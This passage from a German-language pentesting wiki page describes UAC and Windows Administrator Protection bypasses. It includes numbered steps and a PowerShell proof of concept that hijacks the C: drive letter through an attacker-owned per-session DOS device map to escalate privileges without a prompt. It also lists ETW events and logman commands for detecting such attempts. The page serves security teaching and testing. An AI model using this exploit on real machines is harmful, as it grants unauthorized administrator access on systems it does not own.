Einige Chains nach 2024 sehen nicht mehr wie die klassischen Registry-Hijacks unter `HKCU\Software\Classes` aus. Beispielsweise kann Activation-Context-Cache-Poisoning einen **Drive-Remap** und eine **DLL-Redirection** verketten, um über vertrauenswürdige UI- / auto-elevated Binaries wie `ctfmon.exe` und spätere Targets wie `fodhelper.exe` von mittlerer zu hoher Integrity zu gelangen. Statt den umfangreichen PoC hier zu duplizieren, siehe die kompakten Payload-Beispiele unter:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Drive-Letter-Hijack durch Administrator Protection (Preview) über eine DOS-Device-Map pro Logon-Session

> [!NOTE]
> Stand August 2026 dokumentiert Microsoft Administrator Protection weiterhin als **Insider preview**: Der Rollout im Oktober 2025 wurde zurückgenommen und ist für einen späteren Zeitpunkt geplant. Bestätige vor dem Testen dieser Chains, dass **Admin Approval Mode with Administrator protection** tatsächlich aktiviert ist und das Gerät neu gestartet wurde; eine standardmäßige 25H2-Versionszeichenfolge allein beweist nicht, dass das Feature aktiv ist.<sup>[[10]](#references)</sup>

Die vollständige Angriffsfläche von `RAiLaunchAdminProcess` / UIAccess auf Windows-11-25H2-Preview-Builds findest du auf der dedizierten Seite:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 „Administrator Protection“ verwendet Shadow-Admin-Tokens mit sitzungsbezogenen `\Sessions\0\DosDevices/<LUID>`-Maps. Das Verzeichnis wird von `SeGetTokenDeviceMap` beim ersten Auflösen von `\??` lazy erstellt. Wenn der Angreifer das Shadow-Admin-Token nur auf **SecurityIdentification** impersoniert, wird das Verzeichnis mit dem Angreifer als **Owner** erstellt (es übernimmt `CREATOR OWNER`), wodurch Drive-Letter-Links Vorrang vor `\GLOBAL??` erhalten.<sup>[[7]](#references)</sup>

**Schritte:**

1. Rufe aus einer Session mit niedrigen Rechten `RAiProcessRunOnce` auf, um ein promptloses Shadow-Admin-`runonce.exe` zu starten.
2. Dupliziere dessen primäres Token zu einem **Identification**-Token und impersoniere es, während du `\??` öffnest, um die Erstellung von `\Sessions\0\DosDevices/<LUID>` unter der Kontrolle des Angreifers zu erzwingen.
3. Erstelle dort einen `C:`-Symlink, der auf vom Angreifer kontrollierten Speicher zeigt; nachfolgende Dateisystemzugriffe in dieser Session lösen `C:` zum Angreiferpfad auf und ermöglichen einen DLL-/Datei-Hijack ohne Prompt.

**PowerShell-PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
Auf Preview-Hosts protokolliert Administrator Protection Genehmigungen und Fehler als ETW-Ereignisse **15031** und **15032** unter dem Anbieter `Microsoft-Windows-LUA`. Die Ereignisse enthalten die SID des Anforderers, den Anwendungspfad, das Ergebnis, das verwaltete Administratorkonto und die Authentifizierungsmethode. Daher sind wiederholte Exploit-Versuche oder fehlgeschlagene UI-Steuerung nicht ohne Telemetrie.<sup>[[10]](#references)</sup>
```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Funktionsweise der Benutzerkontensteuerung](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Sammlung von UAC bypass techniques](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Kompatibilitätsscanner und Launcher für UAC bypass](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI verwendet AI zur Generierung von PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: 0-Day-Exploitation gegen Ziele südostasiatischer Regierungen](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Umgehen des Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – UAC bypass mit der SilentCleanup-Aufgabe](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – UnifiedConsent-, TabTip- und Narrator-Always-Notify-Bypasses](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Administrator Protection](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
{{#include ../../banners/hacktricks-training.md}}
